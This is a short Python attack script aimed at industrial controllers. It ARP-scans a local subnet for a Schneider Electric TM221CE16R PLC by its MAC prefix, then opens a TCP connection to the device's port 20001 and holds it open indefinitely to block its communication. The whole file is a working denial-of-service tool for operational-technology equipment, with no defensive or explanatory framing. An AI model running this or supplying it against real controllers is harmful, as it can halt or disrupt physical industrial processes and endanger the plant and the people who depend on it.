import scapy.all as scapy
import socket
import time

def find_plc_ip():
    # Send an ARP request to discover devices on the network
    print("[*] Scanning for Schneider Electric TM221CE16R PLC...")
    arp_request = scapy.ARP(pdst="10.0.0.0/24")  # Modify with the subnet if needed
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]

    for sent, received in answered_list:
        # Check for Schneider Electric's MAC prefix (00:80:F4 is a known prefix for Schneider Electric)
        if received.hwsrc.startswith("00:80:F4"):
            print(f"[+] Found Schneider Electric PLC: {received.psrc}")
            return received.psrc

    print("[!] No Schneider Electric PLC found on network.")
    return None

def block_serial_com(plc_ip, port=20001):
    try:
        print(f"[*] Attempting to hold TCP connection to {plc_ip}:{port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((plc_ip, port))

        print(f"[+] Connection established to {plc_ip}:{port}. Holding open...")
        while True:
            time.sleep(10)  # Keep the connection alive
    except KeyboardInterrupt:
        print("\n[*] Script interrupted. Releasing connection.")
    except Exception as e:
        print(f"[!] Error: {e}")
    finally:
        sock.close()
        print("[*] Connection closed.")

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    if plc_ip:
        block_serial_com(plc_ip)